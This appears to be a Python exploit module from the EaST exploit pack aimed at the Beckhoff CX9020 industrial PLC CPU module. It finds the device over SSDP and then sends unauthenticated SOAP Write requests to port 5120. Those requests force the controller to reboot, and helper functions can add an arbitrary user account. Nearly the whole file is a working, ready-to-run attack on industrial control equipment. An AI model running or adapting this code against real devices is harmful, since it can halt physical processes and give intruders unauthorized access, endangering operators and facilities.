#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

import sys
import socket
import httplib
import base64

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efs_Becknoff_CX9020_Reboot"
INFO['DESCRIPTION'] = "Beckhoff CX9020 CPU Module Reboot"
INFO['VENDOR'] = "https://www.beckhoff.com/english.asp?embedded_pc/cx9020.htm"
INFO["CVE Name"] = ""
INFO["NOTES"] = """
Tested on: Beckhoff CX9020 CPU Module
"""

INFO['CHANGELOG'] = "12 Jan, 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["HOST"] = "127.0.0.1"


def rebootMachine(UNS, IP, IO):

        ## This is the SOAP Message:
        SoapMessage = "<?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope "
        SoapMessage += "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/"
        SoapMessage += "encoding/\" xmlns:s=\"http://schemas.xmlsoap.org/soap/"
        SoapMessage += "envelope/\">"
        SoapMessage += "<s:Body><u:Write xmlns:u=\"urn:beckhoff.com:service:"
        SoapMessage += "cxconfig:1\"><netId></netId><nPort>0</nPort>"
        SoapMessage += "<indexGroup>0</indexGroup>"
        SoapMessage += "<IndexOffset>-" + IO + "</IndexOffset>"
        SoapMessage += "<pData>AQAAAAAA</pData></u:Write></s:Body></s:Envelope>"
        ## Construct and send the HTTP POST header
        rebootwebservice = httplib.HTTP(IP + ":5120")
        url = "/upnpisapi?uuid:" + UNS + "+urn:beckhoff.com:serviceId:cxconfig"
        rebootwebservice.putrequest("POST", url)
        rebootwebservice.putheader("Host", IP + ":5120")
        rebootwebservice.putheader("User-Agent", "Tijls Python Script")
        rebootwebservice.putheader("Content-type", "text/xml; charset=utf-8")
        rebootwebservice.putheader("Content-length", "%d" % len(SoapMessage))
        action = "urn:beckhoff.com:service:cxconfig:1#Write"
        rebootwebservice.putheader("SOAPAction", action)
        rebootwebservice.endheaders()
        rebootwebservice.send(SoapMessage)
        ## Get the response
        statuscode, statusmessage, header = rebootwebservice.getreply()
        if statuscode == 200:
                print "Exploit worked, device should be rebooting!"
                return 1
        else:
                print "Something went wrong. This is the response code:"
                ## Printing HTTP Response code
                res = rebootwebservice.getfile().read()
                print res
                return 0


def addUser(UNS, IP, PDATA, IO):

        ## This is the SOAP Message:
        SoapMessage = '<?xml version="1.0" encoding="utf-8"?><s:Envelope '
        SoapMessage += 's:encodingStyle="http://schemas.xmlsoap.org/soap/'
        SoapMessage += 'encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/'
        SoapMessage += 'envelope/"><s:Body><u:Write xmlns:u="urn:beckhoff.com:'
        SoapMessage += 'service:cxconfig:1"><netId></netId><nPort>0</nPort>'
        SoapMessage += '<indexGroup>0</indexGroup>'
        SoapMessage += '<IndexOffset>-' + IO + '</IndexOffset>'
        SoapMessage += '<pData>' + PDATA + '</pData>'
        SoapMessage += '</u:Write></s:Body></s:Envelope>'
        ## Construct and send the HTTP POST header
        rebootwebservice = httplib.HTTP(IP + ":5120")
        url = "/upnpisapi?uuid:" + UNS + "+urn:beckhoff.com:serviceId:cxconfig"
        rebootwebservice.putrequest("POST", url)
        rebootwebservice.putheader("Host", IP + ":5120")
        rebootwebservice.putheader("User-Agent", "Tijls Python Script")
        rebootwebservice.putheader("Content-type", "text/xml; charset=utf-8")
        rebootwebservice.putheader("Content-length", "%d" % len(SoapMessage))
        action = "urn:beckhoff.com:service:cxconfig:1#Write"
        rebootwebservice.putheader("SOAPAction", action)
        rebootwebservice.endheaders()
        rebootwebservice.send(SoapMessage)
        ## Get the response
        statuscode, statusmessage, header = rebootwebservice.getreply()
        if statuscode == 200:
                print "Exploit worked, user is added!"
                return 1
        else:
                print "Something went wrong. This is the response code:"
                ## Printing HTTP Response code
                res = rebootwebservice.getfile().read()
                print res
                return 0


def addOwnUser(UNS, IP, IO, user, password):

        # This will prompt for username and password and then create the custom
        # pData string
        USERNAME = user
        PASSWORD = password
        CONCATENATED = USERNAME + PASSWORD
        # Creating the Full String to encode
        FULLSTRING = chr(16+len(CONCATENATED))
        FULLSTRING += chr(0)+chr(0)+chr(0)
        FULLSTRING += chr(len(USERNAME))
        FULLSTRING += chr(0)+chr(0)+chr(0)+chr(0)+chr(0)+chr(0)+chr(0)
        FULLSTRING += chr(len(PASSWORD))
        FULLSTRING += chr(0)+chr(0)+chr(0)
        FULLSTRING += CONCATENATED
        # Encode a first time, but we don't want any '=' signs in the encoded
        # version
        PDATA = base64.b64encode(FULLSTRING)
        if PDATA.endswith('='):
                FULLSTRING += chr(0)
                PDATA = base64.b64encode(FULLSTRING)
        if PDATA.endswith('='):
                FULLSTRING += chr(0)
                PDATA = base64.b64encode(FULLSTRING)
        # Now we have the correct PDATA string
        print 'We will use this string: '+PDATA
        return addUser(UNS, IP, PDATA, IO)


class exploit(Sploit):
    def __init__(self, host = "", logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.state = "running"
        return
    
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        return


    def run(self):

        self.args()
        IP=self.host
        UNS = ''
        ActiveRebootIndOff = '1329528576'
        # Active means active Engineering Licenses (when PLC has been programmed
        # less than a week ago)
        InactiveRebootIndOff = '1330577152'
        ActiveUserIndOff = '1339031296'
        InactiveUserIndOff = '1340079872'
        self.log('Finding the unique UNS (UUID)')
        self.log('of the target system (' + IP + '), hold on...\n')
        DISCOVERY_MSG = ('M-SEARCH * HTTP/1.1\r\n' +
                 'HOST: 239.255.255.250:1900\r\n' +
                 'MAN: "ssdp:discover"\r\n' +
                 'MX: 3\r\n' +
                 'ST: upnp:rootdevice\r\n' +
                 '\r\n')
        SOCK = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        SOCK.settimeout(10)
        SOCK.sendto(DISCOVERY_MSG, (IP, 1900))
        try:
                RESPONSE = SOCK.recv(1000).split('\r\n')
        except:
                self.log('Something went wrong, is the system online?\n')
                self.log('Try opening http://' + IP + ':5120/config\n')
                self.finish(0)
        for LINE in RESPONSE:
                if ':uuid' in LINE:
                        UNS = LINE[9:45]
                        print 'Got it: ' + LINE[9:45] + '\n'
        SOCK.close()
        if not UNS:
                print '\n\nProblem finding UNS, this is full SSDP response: \n'
                for LINE in RESPONSE: self.log(LINE)
                self.finish(0)
        else:
                self.log('reboot PLC')
                if not rebootMachine(UNS, IP, InactiveRebootIndOff):
                        rebootMachine(UNS, IP, ActiveRebootIndOff)
        self.log("Attack reported no open socket - service died?")
        self.log("Finished this exploit")
        self.finish(1)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()